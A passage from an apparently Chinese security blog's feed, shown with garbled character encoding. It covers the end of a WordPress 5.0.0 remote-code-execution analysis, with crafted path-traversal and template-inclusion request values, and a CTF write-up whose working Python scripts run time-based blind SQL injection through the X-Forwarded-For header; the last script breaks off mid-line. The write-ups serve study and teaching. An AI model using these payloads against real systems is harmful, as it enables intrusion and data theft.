è½½é¡µé¢æ‰€éœ€è¦çš„æ¨¡æ¿æ–‡ä»¶å­˜å‚¨å°±åœ¨wp_postmetaæ•°æ®åº“ä¸­çš„<code>_wp_page_template</code>,è¿™ä¸ªå€¼é»˜è®¤æ˜¯<code>default</code>ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬å…ˆæŸ¥çœ‹ä¸€ä¸‹è¿™ä¸ªå€¼çš„ä½¿ç”¨ä½ç½®ï¼Œå¯ä»¥çœ‹åˆ°åœ¨<code>get_post_meta()</code>å‡½æ•°ä¸­å¯¹è¿™ä¸ªå€¼è¿›è¡Œäº†å–å‡ºï¼Œwp-includes/post-template.php:1683ã€‚<br><img src="https://i.loli.net/2019/03/04/5c7d1e809b7bb.png" alt="å±å¹•å¿«ç…§ 2019-03-04 ä¸‹åˆ8.47.22.png"><br><img src="https://i.loli.net/2019/03/04/5c7d1ee1c4d05.png" alt="å±å¹•å¿«ç…§ 2019-03-04 ä¸‹åˆ8.49.12.png"><br>ç»§ç»­å…¨å±€æ£€ç´¢ä¸€äº›<code>get_page_template_slug()</code>å‡½æ•°çš„å¼•ç”¨ä½ç½®ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ä¸æ¨¡æ¿ç›¸å…³çš„wp-includes/template.phpæ–‡ä»¶ä¸­è¿›è¡Œäº†è°ƒç”¨ã€‚<br><img src="https://i.loli.net/2019/03/04/5c7d2301373ad.png" alt="å±å¹•å¿«ç…§ 2019-03-04 ä¸‹åˆ9.05.45.png"><br>ç»§ç»­çœ‹ä»£ç ï¼Œå‘ç°åªæœ‰ä¸¤ä¸ªå‡½æ•°å¯¹<code>get_page_template_slug()</code>è¿›è¡Œäº†è°ƒç”¨ï¼Œç¬¬ä¸€ä¸ªæ˜¯<code>get_page_template()</code>å‡½æ•°ï¼Œwp-includes/template.php:405ï¼›ç¬¬äºŒä¸ªæ˜¯<code>get_single_template()</code>å‡½æ•°ï¼Œwp-includes/template.php:481<br><img src="https://i.loli.net/2019/03/04/5c7d2387e1958.png" alt="å±å¹•å¿«ç…§ 2019-03-04 ä¸‹åˆ9.09.08.png"><br><img src="https://i.loli.net/2019/03/04/5c7d291bc8c07.png" alt="å±å¹•å¿«ç…§ 2019-03-04 ä¸‹åˆ9.33.05.png"><br>æˆ‘ä»¬ç»§ç»­çœ‹ä¸€ä¸‹<code>get_single_template()</code>å‡½æ•°ï¼Œçœ‹åˆ°åœ¨ <code>get_page_template_slug()</code>å–å€¼ä¹‹åèµ‹å€¼ç»™äº†<code>$template</code>ï¼Œä¹‹å<code>$template</code>ç»è¿‡ç®€å•çš„åˆ¤æ–­åèµ‹å€¼ç»™<code>$templates[]</code>ï¼Œæœ€ç»ˆ<code>$templates</code>å˜é‡ä¼ å…¥<code>get_query_template()</code>å‡½æ•°ï¼Œæˆ‘ä»¬ç»§ç»­è·Ÿè¿›ä¸€ä¸‹ä¸ªå‡½æ•°ï¼Œwp-includes/template.php:23<br><img src="https://i.loli.net/2019/03/04/5c7d2a49216ad.png" alt="å±å¹•å¿«ç…§ 2019-03-04 ä¸‹åˆ9.38.00.png"><br>ä»è¿™æ®µä»£ç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°<code>$templates</code>å˜é‡çš„å€¼åˆä¼ å…¥äº†<code>locate_template()</code>å‡½æ•°ï¼Œç»§ç»­è·Ÿè¿›è¿™ä¸ªå‡½æ•°ï¼Œwp-includes/template.php:629</p><p><img src="https://i.loli.net/2019/03/04/5c7d2ba474915.png" alt="å±å¹•å¿«ç…§ 2019-03-04 ä¸‹åˆ9.43.55.png"><br>ä»ä»£ç ä¸­å¯ä»¥çœ‹åˆ°å¯æ§çš„å˜é‡<code>$template_name</code>å€¼ç»è¿‡æ‹¼æ¥å’Œåˆ¤æ–­å¤„ç†ï¼Œå› æ­¤æˆ‘ä»¬ç»“åˆä¹‹å‰çš„ç›®å½•ç©¿è¶Šé€ æˆçš„ä»»æ„æ–‡ä»¶å†™å…¥é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦å°†æ–°ç”Ÿæˆçš„å›¾ç‰‡æ”¾åˆ°<code>theme-compat</code>ç›®å½•ä¸‹ã€‚</p><p>åˆ†æå®ŒåŠ è½½çš„è·¯å¾„ä¸Šçš„æ–‡ä»¶æ˜¯æˆ‘ä»¬å¯æ§ä¹‹åï¼Œæˆ‘ä»¬æŸ¥çœ‹ä¸‹è½½ä½•å¤„è°ƒç”¨äº†<code>get_single_template()</code>å‡½æ•°ï¼Œå¹¶ä¸”å¯¹å…¶è¿”å›çš„å˜é‡åšäº†ä½•ç§å¤„ç†ã€‚ä»ä¸‹å›¾ä¸­çš„ä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨74è¡Œä½¿ç”¨<code>include</code>å¯¹<code>$template</code>å˜é‡è¿”å›çš„å€¼è¿›è¡Œäº†åŒ…å«ï¼Œä»è€Œå¯ä»¥é€ æˆä»»æ„ä»£ç æ‰§è¡Œã€‚<br><img src="https://i.loli.net/2019/03/04/5c7d2d7995446.png" alt="å±å¹•å¿«ç…§ 2019-03-04 ä¸‹åˆ9.51.43.png"></p><h2 id="0x03-æ¼æ´å¤ç°"><a href="#0x03-æ¼æ´å¤ç°" class="headerlink" title="0x03 æ¼æ´å¤ç°"></a>0x03 æ¼æ´å¤ç°</h2><p>é¦–å…ˆä¸Šä¼ ä¸€å¼ å›¾ç‰‡ï¼Œç‚¹å‡»æ›´æ–°æŒ‰é’®æŠ“åŒ…<br><img src="https://i.loli.net/2019/03/05/5c7e908b900bf.png" alt="å±å¹•å¿«ç…§ 2019-03-05 ä¸‹åˆ11.05.31.png"><br>åœ¨æ•°æ®åŒ…ä¸­æ·»åŠ å¦‚ä¸‹ä¿¡æ¯<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;meta_input[_wp_attached_file]=2019/03/2233.jpg?/../../../../themes/twentysixteen/z3r0yu.jpg</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/05/5c7e93abcd42f.png" alt="å±å¹•å¿«ç…§ 2019-03-05 ä¸‹åˆ11.19.19.png"><br>å¯ä»¥çœ‹åˆ°æ•°æ®åº“ä¸­å·²ç»æˆåŠŸä¿å­˜äº†æˆ‘ä»¬è®¾ç½®çš„å€¼<br><img src="https://i.loli.net/2019/03/05/5c7e93ac8bfe4.png" alt="å±å¹•å¿«ç…§ 2019-03-05 ä¸‹åˆ11.19.52.png"><br>æ¥ä¸‹æ¥å¯¹å›¾ç‰‡è¿›è¡Œå‰ªè£ï¼Œå¹¶æŠ“åŒ…<br><img src="https://i.loli.net/2019/03/05/5c7e942d0eb99.png" alt="å±å¹•å¿«ç…§ 2019-03-05 ä¸‹åˆ11.22.09.png"><br>ä¿®æ”¹æ•°æ®åŒ…å†…å®¹å¦‚ä¸‹<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action=crop-image&amp;_ajax_nonce=1cc3d57951&amp;id=15&amp;cropDetails[x1]=10&amp;cropDetails[y1]=10&amp;cropDetails[width]=10&amp;cropDetails[height]=10&amp;cropDetails[dst_width]=100&amp;cropDetails[dst_height]=100</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/05/5c7e94ea63e5b.png" alt="å±å¹•å¿«ç…§ 2019-03-05 ä¸‹åˆ11.24.35.png"><br>æœ€ç»ˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å›¾ç‰‡å·²ç»åœ¨å¯¹åº”çš„è·¯å¾„ä¸‹äº†<br><img src="https://i.loli.net/2019/03/05/5c7e94e8b649b.png" alt="å±å¹•å¿«ç…§ 2019-03-05 ä¸‹åˆ11.24.58.png"><br>æ¥ä¸‹æ¥è¿›è¡Œæ–‡ä»¶åŒ…å«ï¼Œæˆ‘ä»¬é€‰æ‹©ä¸Šä¼ ä¸€ä¸ªrce.txtï¼Œç„¶åå†æ¬¡ä¿®æ”¹ä¿¡æ¯ï¼Œä¸æœ€åˆçš„æ–¹å¼ä¸€æ ·ï¼Œæ­¤å¤„åŠ ä¸Šå¦‚ä¸‹çš„é”®å€¼<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;meta_input[_wp_page_template]=cropped-z3r0yu.jpg</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2019/03/05/5c7e965ac7b1f.png" alt="å±å¹•å¿«ç…§ 2019-03-05 ä¸‹åˆ11.30.36.png"><br><img src="https://i.loli.net/2019/03/05/5c7e96422d642.png" alt="å±å¹•å¿«ç…§ 2019-03-05 ä¸‹åˆ11.31.00.png"><br>å¯ä»¥çœ‹æ‡‚æ•°æ®åº“ä¸­å·²ç»å¯¹åº”çš„å€¼å·²ç»ä¿®æ”¹<br><img src="https://i.loli.net/2019/03/05/5c7e96c489671.png" alt="å±å¹•å¿«ç…§ 2019-03-05 ä¸‹åˆ11.33.10.png"><br>æœ€ç»ˆæˆåŠŸRCE<br>(PS:æ­¤å¤„æœ‰ä¸ªå°å‘ï¼Œå¦‚æœä½ è¦æ˜¯è®¿é—®é™„ä»¶å‡ºç°äº†404ï¼Œé‚£ä¹ˆè®¾ç½®ä¸€ä¸‹å›ºå®šè¿æ¥å³å¯)<br><img src="https://i.loli.net/2019/03/06/5c7ea650cf4c9.png" alt="å±å¹•å¿«ç…§ 2019-03-06 ä¸Šåˆ12.39.16.png"></p><h2 id="0x04-æ€»ç»“"><a href="#0x04-æ€»ç»“" class="headerlink" title="0x04 æ€»ç»“"></a>0x04 æ€»ç»“</h2><p>è¿™ä¸ªæ¼æ´çš„åˆ†æå’Œç¯å¢ƒæ­å»ºçš„è¿‡ç¨‹ä¸­å‘ç‚¹ä¸å°‘ï¼Œå…ˆå¯¹å‘ç‚¹åšä¸€ä¸ªå°ç»“ï¼š</p><ol><li>wordpressè‡ªåŠ¨æ›´æ–°å¤„ç†ï¼Œåœ¨wp-config.phpä¸­åŠ å¦‚ä¸€è¡Œä»£ç <code>define(&#39;AUTOMATIC_UPDATER_DISABLED&#39;,true);</code>æ¥ç¦æ­¢æ›´æ–°ã€‚</li><li>Imagickå’ŒGDå¯¹å›¾ç‰‡çš„å¤„ç†æ–¹å¼ä¸åŒçš„é—®é¢˜ï¼Œå¯¹GDçš„åˆ©ç”¨éœ€è¦Fuzzå‡ºpaylaodï¼ŒImagickç›´æ¥ä¿®æ”¹exiféƒ¨åˆ†å³å¯ã€‚</li><li>Windows ä¸‹çš„ç›®å½•ä¸èƒ½å«æœ‰?ï¼Œå› æ­¤æœ€å¥½é‡‡ç”¨#ã€‚</li><li>Linuxä¸‹ç”±äºxxx.jpg#æ˜¯ä¸ªä¸å­˜åœ¨çš„ç›®å½•ï¼Œå› æ­¤è°ƒç”¨Imagickçš„<code>writeImage</code>å‡½æ•°ä¼šè°ƒç”¨å¤±è´¥æŠ›å‡ºé”™è¯¯ç»ˆæ­¢æµç¨‹ï¼Œè¿›è€Œæ— æ³•è¾¾æˆç¬¬äºŒä¸ªæ¼æ´çš„åˆ©ç”¨ï¼Œä½†æ˜¯çœ‹åˆ°balisongå¸ˆå‚…å€ŸåŠ©å¤šæ¬¡ä¸Šä¼ è£å‰ªæ¥ç»•è¿‡è¿™ä¸ªå‘ç‚¹(ç›®å‰ç¬”è€…è¿˜æœªæˆåŠŸå¯¹æ­¤æµ‹è¯•æˆåŠŸ)ã€‚</li><li>å®˜ç½‘çš„æ‰€ä»¥releaseç‰ˆæœ¬éƒ½ä¿®å¤äº†è¿™ä¸ªæ¼æ´ã€‚</li><li>å›ºå®šè¿æ¥è®¾ç½®é—®é¢˜ï¼Œé»˜è®¤é…ç½®ä¸‹æŸ¥çœ‹é™„ä»¶ä¼šå‡ºç°404ã€‚</li></ol><p>æ¼æ´æ„æˆæ€è·¯æ€»ç»“ï¼šé¦–å…ˆæ˜¯ä¸€ä¸ªå˜é‡è¦†ç›–ï¼Œå°†æˆ‘ä»¬éœ€è¦çš„<code>../</code>å¼•å…¥æ•°æ®åº“ï¼›ä¹‹åæ˜¯ä¸€ä¸ªå‰ªè£å›¾ç‰‡åŠŸèƒ½æœªå¯¹å˜é‡å†…å®¹è¿›è¡Œå®¡æŸ¥é€ æˆç›®å½•ç©¿è¶Šå†™æ–‡ä»¶ï¼›æœ€åæ˜¯æ¨¡æ¿å‚æ•°å¤„ç†è¿‡ç¨‹ä¸­çš„ä¸€ä¸ªæœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæœ€ç»ˆæ„æˆRCEã€‚æ¯ä¸ªæ¼æ´ç‹¬ç«‹å‡ºæ¥å±å®³éƒ½æä½ï¼Œä½†æ˜¯ç»„åˆåå´å¯ä»¥å¯¼è‡´RCEçš„å‡ºç°ï¼Œæ­¤æ”»å‡»é“¾çš„æ„é€ ååˆ†ç²¾å¦™ã€‚</p><h2 id="0x05-å‚è€ƒ"><a href="#0x05-å‚è€ƒ" class="headerlink" title="0x05 å‚è€ƒ"></a>0x05 å‚è€ƒ</h2><p><a href="https://blog.ripstech.com/2019/wordpress-image-remote-code-execution/" target="_blank" rel="noopener">ã€ŠWordPress 5.0.0 Remote Code Executionã€‹â€“Simon Scannell</a><br><a href="https://paper.seebug.org/822/" target="_blank" rel="noopener">ã€ŠWordPress 5.0 RCE è¯¦ç»†åˆ†æã€‹â€“LoRexxarâ€™</a><br><a href="https://mp.weixin.qq.com/s/9DMGLOvFJUjq8MaMr9eg6A" target="_blank" rel="noopener">ã€ŠWordpress 5.0.0è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æä¸å¤ç°ã€‹â€“balisong</a><br><a href="https://kylingit.com/blog/wordpress-image-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">ã€ŠWORDPRESS IMAGE è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´åˆ†æã€‹â€“è¯—ä¸èƒ¡è¯´</a><br><a href="https://www.leavesongs.com/other/tinger.html" target="_blank" rel="noopener">ã€ŠWordpress \&lt; 4.1.2 å­˜å‚¨å‹XSSåˆ†æä¸ç¨³å®šPOCã€‹â€“phithon</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-æ¦‚è¿°&quot;&gt;&lt;a href=&quot;#0x00-æ¦‚è¿°&quot; class=&quot;headerlink&quot; title=&quot;0x00 æ¦‚è¿°&quot;&gt;&lt;/a&gt;0x00 æ¦‚è¿°&lt;/h2&gt;&lt;p&gt;RIPSäº2æœˆ20æ—¥åœ¨åšå®¢ä¸ŠæŠ«éœ²äº†ä¸€ä¸ªå…³äºWordPress 5.0.0çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚æ­¤æ¼æ´ç”±
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>CTFä¸­çš„SQLi</title>
    <link href="http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/"/>
    <id>http://zer0yu.github.io/2018/11/24/SQLi-in-CTF/</id>
    <published>2018-11-24T10:01:30.000Z</published>
    <updated>2018-11-24T12:40:01.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-httpå¤´xffçš„æ—¶é—´ç›²æ³¨"><a href="#0x01-httpå¤´xffçš„æ—¶é—´ç›²æ³¨" class="headerlink" title="0x01 httpå¤´xffçš„æ—¶é—´ç›²æ³¨"></a>0x01 httpå¤´xffçš„æ—¶é—´ç›²æ³¨</h2><p>é¢˜ç›®ä»£ç å¦‚ä¸‹ï¼Œä»é¢˜ç›®åˆ†æå¯ä»¥çœ‹åˆ°$ipæ˜¯ä»xxfå‚æ•°ä¸­è·å–çš„ï¼Œå¹¶å†ä½¿ç”¨explodeå‡½æ•°å¤„ç†å(æ³¨æ„åœ¨è¿™é‡Œä½¿ç”¨äº†,å·ä½œä¸ºåˆ†éš”ç¬¦ï¼Œå› è€Œæˆ‘ä»¬æ’å…¥çš„sqlè¯­å¥ä¸­ä¸èƒ½å‡ºç°,å·äº†)ï¼Œç›´æ¥ä»£å…¥sqlè¯­å¥ï¼Œå› è€Œæ˜¯å­˜åœ¨sqlæ³¨å…¥æ¼æ´ã€‚å› ä¸ºå…³é—­äº†æŠ¥é”™ï¼Œå› è€Œåªèƒ½é‡‡ç”¨æ—¶é—´ç›²æ³¨çš„æ–¹å¼ã€‚</p><p>å› ä¸º,å·ä¸èƒ½ä½¿ç”¨ï¼Œæ‰€ä»¥å°±æ„å‘³ç€limit 0,1ä¸èƒ½ä½¿ç”¨ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨from 0 for 1è¿›è¡Œä»£æ›¿ï¼›ifåˆ¤æ–­åœ¨æ­¤å¤„ä¸èƒ½ä½¿ç”¨äº†ï¼Œä½†æ˜¯å¯ä»¥ä½¿ç”¨select case whenï¼ˆæ»¡è¶³æ¡ä»¶ï¼‰thenï¼ˆè¯­å¥1ï¼‰elseï¼ˆè¯­å¥2ï¼‰ endè¯­å¥è¿›è¡Œä»£æ›¿</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getIp</span><span class="params">()</span></span>&#123;</span><br><span class="line">$ip = <span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>]))&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">$ip = $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line">$ip_arr = explode(<span class="string">','</span>, $ip);</span><br><span class="line"><span class="keyword">return</span> $ip_arr[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$host=<span class="string">"localhost"</span>;</span><br><span class="line">$user=<span class="string">""</span>;</span><br><span class="line">$pass=<span class="string">""</span>;</span><br><span class="line">$db=<span class="string">""</span>;</span><br><span class="line"></span><br><span class="line">$connect = mysql_connect($host, $user, $pass) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to connect"</span>);</span><br><span class="line"></span><br><span class="line">mysql_select_db($db) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Unable to select database"</span>);</span><br><span class="line"></span><br><span class="line">$ip = getIp();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'your ip is :'</span>.$ip;</span><br><span class="line">$sql=<span class="string">"insert into client_ip (ip) values ('$ip')"</span>;</span><br><span class="line">mysql_query($sql);</span><br></pre></td></tr></table></figure><p>æ•°æ®åº“åçš„æ³¨å…¥è„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr(database() from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span>:</span><br><span class="line">            database = database + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of database is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'database:'</span>,database)</span><br></pre></td></tr></table></figure><p>æ³¨å…¥è¡¨åçš„ä»£ç å¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">table_name = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            table_name = table_name + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'table_name:'</span>,table_name)</span><br></pre></td></tr></table></figure><p>æ³¨å…¥å¾—åˆ°åˆ—å</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">column_name = <span class="string">''</span></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='flag') from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            column_name = column_name + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            flag = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> flag == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span class="string">'column_name:'</span>,column_name)</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆæ³¨å…¥å¾—åˆ°åˆ—ä¸­çš„æ•°æ®</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.24.86.145:8002/web15/'</span></span><br><span class="line">allString = <span class="string">'''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'"|\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">f = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> allString:</span><br><span class="line">        header = &#123;</span><br><span class="line">            <span class="string">"X-Forwarded-For"</span>:<span class="string">"1'+(select case when (ascii(substr((select flag from flag) from %d for 1))=%d) then sleep(3) else 0 end))#"</span>%(i,ord(j))</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.get(url,headers=header)</span><br><span class="line">        t = r.elapsed.total_seconds()</span><br><span class="line">        print(<span class="string">'the time of '</span>+j+<span class="string">' is '</span>+str(t))</span><br><span class="line">        <span class="keyword">if</span> t &gt;= <span class="number">3</span> <span class="keyword">and</span> t &lt; <span class="number">4</span>:</span><br><span class="line">            flag = flag + j</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of table_name is '</span>+j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span> t &lt; <span class="number">3</span> <span class="keyword">and</span> j == <span class="string">'M'</span>:</span><br><span class="line">            f = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span> :</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">print(<span 